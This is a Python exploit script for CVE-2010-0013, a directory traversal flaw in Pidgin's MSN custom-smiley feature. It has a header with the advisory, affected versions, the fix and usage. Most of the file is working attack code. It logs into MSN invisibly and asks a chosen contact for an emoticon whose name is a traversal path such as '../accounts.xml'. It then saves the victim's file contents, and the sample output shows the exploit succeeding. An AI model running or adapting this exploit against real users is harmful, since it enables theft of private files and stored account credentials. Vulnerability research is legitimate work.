#!/usr/bin/env python
"""
Pidgin MSN <= 2.6.4 file download vulnerability
 
19 January 2010
 
Mathieu GASPARD (gaspmat@gmail.com)
 
 
Description:
        Pidgin is a multi-protocol Instant Messenger.
 
        This is an exploit for the vulnerability[1] discovered in Pidgin by Fabian Yamaguchi.
        The issue is caused by an error in the MSN custom smiley feature when processing emoticon requests,
        which could allow attackers to disclose the contents of arbitrary files via directory traversal attacks.
 
Affected versions :
        Pidgin <= 2.6.4, Adium and other IM using Pidgin-libpurple/libmsn library.
        Plugin msn-pecan 0.1.0-rc2  (http://code.google.com/p/msn-pecan/) IS also vulnerable even if Pidgin is up to date
 
Plateforms :
        Windows, Linux, Mac
 
Fix :
        Fixed in Pidgin 2.6.5
        Update to the latest version : http://www.pidgin.im/download/
 
References :
        [1] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0013
        [2] http://www.pidgin.im/news/security/?id=42
 
Usage :
        You need the Python MSN Messenger library : http://telepathy.freedesktop.org/wiki/Pymsn
        python pidgin_exploit.py -a YOUR_MSN_EMAIL -c TARGET_MSN_EMAIL -f FILE [-o OUTPUT_FILE] [-l]
 
Example :
# python pidgin_exploit.py -a foo@hotmail.com -c victim@hotmail.com -f ../accounts.xml [-o accounts.xml]
 
        ***********************************************************
 
        Pidgin MSN file download vulnerability (CVE-2010-0013)
 
        Usage: %prog -a YOUR_MSN_EMAIL -c TARGET_MSN_EMAIL -f FILE_REQUESTED [-o DESTINATION_FILE] [-l]
 
        ***********************************************************
 
        Please enter the password for the account "foo@hotmail.com"
        Password:
        [+] Connecting to server
        [+] Authentication in progress
        [+] Synchronisation in progress
        [+] OK, all done, ready to proceed
        [+] Sending request for file "../accounts.xml" to "victim@hotmail.com"
        [+] Using session_id 974948028
        Current : 3606, total: 3881  (92%)
        [+] Got an answer from the contact
        ----------------
        <?xml version='1.0' encoding='UTF-8' ?>
 
        <account version='1.0'>
        ........
"""
 
 
import warnings
warnings.simplefilter("ignore",DeprecationWarning)
import os
import sys
try:
    import pymsn
except ImportError:
    print "Pymsn couldn't be loaded"
    print "On debian-like systems, the package is python-msn"
    sys.exit(-1)
import gobject
import logging
import getpass
import hashlib
from optparse import OptionParser
import signal
import time
 
SERVER_ADDRESS = 'messenger.hotmail.com'
SERVER_PORT = 1863
FD_OUT = sys.stdout
MAINLOOP = None
# seconds after which, if we didn't get an answer, we quit
TIMEOUT = 5
 
global_client = None
 
def quit():
    MAINLOOP.quit()
    sys.exit(0)
     
 
def check_if_succeeds():
    # if False, we didn't get a chunk so we won't get any file, so we quit
    if global_client.GOT_CONTROL_BLOB == False:
        print "[+] Didn't get an answer from the client after %d seconds, it's likely not vulnerable or the file requested doesn't exist/is not accessible"%TIMEOUT
        print "[+] Exiting"
        global_client.quit()
 
# called when we get the result data, after our request
def handle_answer(object, client):
    print "\n[+] Got an answer from the contact"
    d = object._data
    data = d.read()
    length = len(data)
    FD_OUT.write(data)
    # if we wrote output to stdout, don't close it
    if FD_OUT != sys.stdout:
        FD_OUT.close()
        print "[+] Wrote %d bytes to file"%length
    client.end = time.time()
    duration = client.end - client.begin
    print "[+] Download lasted %d seconds at %d bytes/s "%(duration,(length/duration))
    client.quit()
 
def my_on_chunk_recv(transport, chunk):
    global_client._p2p_session_manager._transport_manager._on_chunk_received_OLD(transport, chunk)
    session_id = chunk.header.session_id
    blob_id = chunk.header.blob_id
    if session_id == global_client.session_id:
        # first blob is control, we "squeeze" it and keep only the second one
        if global_client.GOT_CONTROL_BLOB == False:
            #print "Got Control blob in our connection (session_id : %d, blob_id: %d)"%(session_id, blob_id)
            global_client.GOT_CONTROL_BLOB = True
        else:
            # if connections is complete, session_id is removed from data_blobs so we have to check before accessing it
            if global_client._p2p_session_manager._transport_manager._data_blobs.has_key(session_id):
                current_blob = global_client._p2p_session_manager._transport_manager._data_blobs[session_id]
                print "Current : %d, total: %d  (%d%%)\r"%(current_blob.current_size, current_blob.total_size, ((current_blob.current_size*100)/current_blob.total_size)),
                sys.stdout.flush()
 
 
def error_handler(self, error_type, error):
    # __on_user_invitation_failed, probably because contact is offline/invisible
    if error_type == pymsn.event.ConversationErrorType.CONTACT_INVITE and \
    error == pymsn.event.ContactInviteError.NOT_AVAILABLE:
        print "[*] ERROR, contact didn't accept our invite, probably because it is disconnected/invisible"
        quit()
    # __on_message_undelivered, probably because contact is offline/invisible
    if error_type ==  pymsn.event.ConversationErrorType.MESSAGE and \
    error ==  pymsn.event.MessageError.DELIVERY_FAILED:
        print "[*] ERROR, couldn't send message, probably because contact is disconnected/invisible"
        quit()
    print "[*] Unhandled error, error_type : %d , error : %d"%(error_type, error)
    quit()
     
class MyClient(pymsn.Client):
    def __init__(self, server, quit, victim, filename, list_only, proxies={}, transport_class=pymsn.transport.DirectConnection):
        # callback to quit
        self.quit = quit
        # victim from whom we request the file
        self.victim = victim
        # just list contacts for this account
        self.list_only = list_only
        # file we request
        self.filename = filename
        # to calculate download duration and speed
        self.begin = 0
        self.end = 0
        # session_id of the connection to retrieve the file
        self.session_id = 0
        # have we already seen the "control blob" for this connection
        self.GOT_CONTROL_BLOB = False
        pymsn.Client.__init__(self, server)
        # REALLY REALLY HACKISH
        # if contact is disconnected/invisible, a "NotImplementedError" exception is raised
        # and it can't be caught AFAIK so it needs to be redefined here
        # handler_class should be SwitchboardClient
        for handler_class, extra_args in self._switchboard_manager._handlers_class:
            handler_class._on_error = error_handler
 
 
 
class MyMSNObjectStore(pymsn.p2p.MSNObjectStore):
    def __compute_data_hash(self, data):
        digest = hashlib.sha1()
        data.seek(0, 0)
        read_data = data.read(1024)
        while len(read_data) > 0:
            digest.update(read_data)
            read_data = data.read(1024)
        data.seek(0, 0)
        return digest.digest()
 
    # need to compute the SHA hash (SHAd in MSNObject) otherelse the function in MSNObjectStore complains because
    # the hash of the data we receive is not the hash we expected (hash we expect is the one we send, which is always the same here)
    def _outgoing_session_transfer_completed(self, session, data):
        handle_id, callback, errback, msn_object = self._outgoing_sessions[session]   
        msn_object._data_sha = self.__compute_data_hash(data)        
        super(MyMSNObjectStore, self)._outgoing_session_transfer_completed(session, data)
 
class ClientEventHandler(pymsn.event.ClientEventInterface):
             
    def on_client_error(self, error_type, error):
        if error_type == pymsn.event.ClientErrorType.AUTHENTICATION:
             print "[+] Authentication failed, bad login/password"
             self._client.quit()
        else:
             print "[*] ERROR :", error_type, " ->", error
              
    def on_client_state_changed(self, state):
        #print "State changed to %s" % state
        if state == pymsn.client.ClientState.CLOSED:
            print "[+] Connection to server closed"
            self._client.quit()
             
        if state == pymsn.client.ClientState.CONNECTING:
            if self.current_state != state:
                print "[+] Connecting to server"
            self.current_state = state
        if state == pymsn.client.ClientState.AUTHENTICATING:
            if self.current_state != state:
                print "[+] Authentication in progress"
            self.current_state = state
        if state == pymsn.client.ClientState.SYNCHRONIZING:
            if self.current_state != state:
                print "[+] Synchronisation in progress"
            self.current_state = state
 
        if state == pymsn.client.ClientState.OPEN:
            print "[+] OK, all done, ready to proceed"
            self._client.profile.presence = pymsn.Presence.INVISIBLE
            contact_dict = {}
            for i in self._client.address_book.contacts:
                contact_dict[i.account] = i
            if self._client.list_only:
                for (k,v) in contact_dict.items():
                    print k+" ("+v.display_name+")"
                self._client.quit()
            else:
                if self._client.victim not in contact_dict.keys():
                    print "[*] Error, contact %s not in your contact list"%self._client.victim
                    self._client.quit()
                else:
                    contact = contact_dict[self._client.victim]
                    store = MyMSNObjectStore(self._client)
                    object = pymsn.p2p.MSNObject(contact, 65535, pymsn.p2p.MSNObjectType.CUSTOM_EMOTICON, self._client.filename, 'AAA=','2jmj7l5rSw0yVb/vlWAYkK/YBwk=')
                    print "[+] Sending request for file \"%s\" to \"%s\""%(self._client.filename, self._client.victim)
                    self._client.begin = time.time()
                    store.request(object, [handle_answer, self._client])
                    # at this moment, we got only one session_id, the one we will use to request the file
                    for k in store._outgoing_sessions.keys():
                        print "[+] Using session_id %d"%k._id
                        self._client.session_id = k._id
                    # hack to set up my own callback each time we receive a chunk, used to print the percentage of the download
                    self._client._p2p_session_manager._transport_manager._on_chunk_received_OLD = self._client._p2p_session_manager._transport_manager._on_chunk_received
                    self._client._p2p_session_manager._transport_manager._on_chunk_received = my_on_chunk_recv
                    # if no file transfer received from the victim after TIMEOUT seconds, quit
                    gobject.timeout_add(TIMEOUT*1000, check_if_succeeds)
 
    def __init__(self, client):
        self.current_state = None
        pymsn.event.ClientEventInterface.__init__(self, client)
 
 
if __name__ == '__main__':
    print "***********************************************************\n"
    print "Pidgin MSN file download vulnerability (CVE-2010-0013)\n"
    print "Usage: %prog -a YOUR_MSN_EMAIL -c TARGET_MSN_EMAIL -f FILE_REQUESTED [-o DESTINATION_FILE] [-l]\n"
    print "***********************************************************\n"
 
    usage = "Usage: %prog -a YOUR_MSN_EMAIL -c TARGET_MSN_EMAIL -f FILE_REQUESTED [-o DESTINATION_FILE] [-l] "
    parser = OptionParser(usage=usage)
    parser.add_option("-f", "--file", dest="filename", default=None,
                      help="File requested to remote contact")
    parser.add_option("-o", "--output", dest="output_file", default=None,
                      help="Where to write received file, STDOUT otherelse")
    parser.add_option("-a", "--account", dest="account", default=None,
                      help="MSN account to use")
    parser.add_option("-c", "--contact", dest="contact", default=None,
                      help="Contact to request file from")
    parser.add_option("-l", "--list", dest="list_only", action="store_true", default=False,
                      help="Just print contact list for your account and exit")
     
    (options, args) = parser.parse_args()
    if not options.filename or not options.account or not options.contact:
        if not (options.account and options.list_only):
            print "Error, parameter missing"
            parser.print_help()
            sys.exit(-1)
 
    if options.output_file != None:
        try:
            FD_OUT = open(options.output_file,"wb")
        except Exception,e:
            print "Cannot open file %s (%s)"%(options.output_file, e)
            sys.exit(-1)
 
    MAINLOOP = gobject.MainLoop()
 
    def sigterm_cb():
        gobject.idle_add(quit)
 
    signal.signal(signal.SIGTERM, sigterm_cb)
 
    logging.basicConfig(level=logging.CRITICAL) # allows us to see the protocol debug
    server = (SERVER_ADDRESS, SERVER_PORT)
    client = MyClient(server, quit, options.contact, options.filename, options.list_only)
    global_client = client
    client_events_handler = ClientEventHandler(client)
    print "Please enter the password for the account \"%s\""%options.account
    try:
        passwd = getpass.getpass()
    except KeyboardInterrupt:
        quit()
 
    login_info = (options.account, passwd)
    client.login(*login_info)
    try:
        MAINLOOP.run()
    except KeyboardInterrupt:
        quit()